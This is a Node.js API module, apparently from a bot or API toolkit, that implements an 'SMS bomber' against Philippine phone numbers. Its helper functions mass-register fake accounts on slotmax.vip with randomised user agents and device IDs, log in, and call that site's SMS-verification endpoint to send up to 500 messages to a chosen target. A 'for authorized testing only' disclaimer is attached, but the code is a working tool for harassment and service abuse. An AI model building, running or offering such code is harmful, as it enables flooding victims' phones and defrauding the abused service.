const axios = require("axios");
const randomUseragent = require("random-useragent");

// Valid API keys
const VALID_API_KEYS = ["selovasx123"];

module.exports = {
  meta: {
    name: "SMS Bomber",
    description: "Send bulk SMS to a target phone number for testing purposes",
    author: "Jaybohol",
    version: "1.0.0",
    category: "tools",
    method: "GET",
    path: "/smsbomber?Number=&amount=&apiKey="
  },
  
  onStart: async function({ req, res }) {
    try {
      // API Key Authentication
      const apiKey = req.query.apiKey || req.query.api_key || req.query.apikey;
      
      // Check if API key is provided
      if (!apiKey) {
        return res.status(401).json({
          status: false,
          error: "API key is required",
          usage: {
            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
            required_params: {
              Number: "Philippine phone number (supports +63, 63, 09, or 9 formats)",
              amount: "Number of SMS to send (1-500)",
              apiKey: "Valid API key for authentication (selovasx123)"
            }
          }
        });
      }
      
      // Validate API key
      if (!VALID_API_KEYS.includes(apiKey)) {
        return res.status(403).json({
          status: false,
          error: "Invalid API key",
          message: "The provided API key is not valid. Please use a valid API key.",
          valid_keys: VALID_API_KEYS
        });
      }
      
      // Both parameters are required - support multiple parameter names
      let targetPhone = req.query.Number || req.query.phone || req.query.number;
      let smsCount = req.query.amount || req.query.times || req.query.count;
      
      // Validate both parameters are present
      if (!targetPhone) {
        return res.status(400).json({
          status: false,
          error: "Phone number is required",
          usage: {
            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
            required_params: {
              Number: "Philippine phone number (supports +63, 63, 09, or 9 formats)",
              amount: "Number of SMS to send (1-500)",
              apiKey: "Valid API key for authentication"
            }
          }
        });
      }
      
      if (!smsCount) {
        return res.status(400).json({
          status: false,
          error: "Amount parameter is required",
          usage: {
            example: "/smsbomber?Number=09916527333&amount=1&apiKey=selovasx123",
            required_params: {
              Number: "Philippine phone number",
              amount: "Number of SMS to send (1-500)",
              apiKey: "Valid API key for authentication"
            }
          }
        });
      }
      
      // Parse and validate SMS count
      smsCount = parseInt(smsCount, 10);
      
      if (isNaN(smsCount)) {
        return res.status(400).json({
          status: false,
          error: "Invalid amount parameter",
          details: {
            received: req.query.amount,
            message: "Amount must be a valid number",
            example: "amount=10"
          }
        });
      }
      
      // Format and validate phone number
      let originalPhone = targetPhone;
      let formattedPhone = targetPhone;
      
      if (formattedPhone.startsWith("+63")) {
        formattedPhone = formattedPhone.slice(3);
      } else if (formattedPhone.startsWith("63")) {
        formattedPhone = formattedPhone.slice(2);
      } else if (formattedPhone.startsWith("0")) {
        formattedPhone = formattedPhone.slice(1);
      }
      
      // Check if phone number is valid (10 digits)
      if (!formattedPhone || !/^\d{10}$/.test(formattedPhone)) {
        return res.status(400).json({
          status: false,
          error: "Invalid phone number format",
          details: {
            provided: originalPhone,
            expected_formats: ["09916527333", "639916527333", "+639916527333", "9916527333"],
            message: "Please use a valid Philippine phone number"
          }
        });
      }
      
      // Validate SMS count range
      if (smsCount > 500) {
        return res.status(400).json({
          status: false,
          error: "Maximum SMS limit exceeded",
          details: {
            requested: smsCount,
            maximum: 500,
            message: "Please request 500 or fewer SMS messages"
          }
        });
      }
      
      if (smsCount < 1) {
        return res.status(400).json({
          status: false,
          error: "Invalid SMS count",
          details: {
            requested: smsCount,
            minimum: 1,
            message: "Please request at least 1 SMS"
          }
        });
      }
      
      console.log(`🔑 API Key: ${apiKey} - Starting SMS bombing to ${formattedPhone} (${smsCount} times)...`);
      
      let successCount = 0;
      let failCount = 0;
      const errors = [];
      const startTime = Date.now();
      
      // Send SMS in batches to avoid overwhelming the system
      const batchSize = 10;
      const batches = Math.ceil(smsCount / batchSize);
      
      for (let batch = 0; batch < batches; batch++) {
        const batchStart = batch * batchSize;
        const batchEnd = Math.min(batchStart + batchSize, smsCount);
        const batchPromises = [];
        
        for (let i = batchStart; i < batchEnd; i++) {
          batchPromises.push(sendSingleSms(formattedPhone, i + 1));
        }
        
        const results = await Promise.allSettled(batchPromises);
        
        results.forEach(result => {
          if (result.status === 'fulfilled' && result.value.success) {
            successCount++;
          } else {
            failCount++;
            if (result.reason) {
              errors.push(result.reason);
            } else if (result.value?.error) {
              errors.push(result.value.error);
            }
          }
        });
        
        // Small delay between batches to prevent rate limiting
        if (batch < batches - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
      
      const endTime = Date.now();
      const duration = ((endTime - startTime) / 1000).toFixed(2);
      
      // Format phone number for display
      const displayPhone = `+63${formattedPhone}`;
      
      res.json({
        status: true,
        authenticated: true,
        api_key_used: apiKey,
        message: "SMS bombing completed",
        target: {
          original: originalPhone,
          formatted: displayPhone,
          number: formattedPhone
        },
        request: {
          requested_count: smsCount,
          successful: successCount,
          failed: failCount,
          success_rate: `${((successCount / smsCount) * 100).toFixed(2)}%`
        },
        performance: {
          duration_seconds: parseFloat(duration),
          sms_per_second: (smsCount / duration).toFixed(2)
        },
        errors: errors.length > 0 ? errors.slice(0, 10) : undefined,
        author: "Jaybohol",
        timestamp: new Date().toISOString(),
        disclaimer: "This tool is for authorized testing only."
      });
      
    } catch (error) {
      console.error("SMS Bomber Error:", error.message);
      
      res.status(500).json({
        status: false,
        error: "Failed to complete SMS bombing",
        details: error.message,
        author: "Jaybohol",
        timestamp: new Date().toISOString()
      });
    }
  }
};

// Helper functions
const generateRandomString = (length) => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
};

const generateUuidDeviceId = () => {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
};

const createAccount = async (username, password, phone) => {
  try {
    const { data } = await axios.post(
      "https://slotmax.vip/api/user/custom/register",
      {
        username,
        password,
        code: Date.now(),
        phone,
        areaCode: "63"
      },
      {
        headers: {
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
          "Accept": "application/json, text/plain, */*",
          "Content-Type": "application/json",
          "requestfrom": "H5",
          "deviceid": generateUuidDeviceId(),
          "referer": `https://slotmax.vip/game`
        },
        timeout: 10000
      }
    );
    return data;
  } catch (error) {
    console.error("Account creation error:", error.response?.data || error.message);
    return null;
  }
};

const login = async (username, password) => {
  try {
    const { headers } = await axios.post(
      "https://slotmax.vip/api/user/login",
      {
        username,
        password
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
        },
        timeout: 10000
      }
    );
    return headers["set-cookie"]?.[0] || null;
  } catch (error) {
    console.error("Login error:", error.response?.data || error.message);
    return null;
  }
};

const sendSms = async (cookie, phone) => {
  try {
    const { data } = await axios.post(
      "https://slotmax.vip/api/user/sms/send/bind",
      {
        phone,
        areaCode: "63"
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
          cookie,
        },
        timeout: 15000
      }
    );
    return data;
  } catch (error) {
    console.error("SMS send error:", error.response?.data || error.message);
    return null;
  }
};

const sendSingleSms = async (phone, attemptNumber) => {
  try {
    const username = generateRandomString(12);
    const password = generateRandomString(16);
    
    const account = await createAccount(username, password, phone);
    if (!account) {
      return { success: false, error: "Account creation failed" };
    }
    
    const cookie = await login(username, password);
    if (!cookie) {
      return { success: false, error: "Login failed" };
    }
    
    const result = await sendSms(cookie, phone);
    if (result?.success) {
      console.log(`✅ SMS ${attemptNumber} sent successfully to ${phone}.`);
      return { success: true };
    } else {
      console.log(`❌ SMS ${attemptNumber} failed to ${phone}.`);
      return { success: false, error: result?.message || "SMS send failed" };
    }
  } catch (error) {
    console.error(`❌ SMS ${attemptNumber} error:`, error.message);
    return { success: false, error: error.message };
  }
};
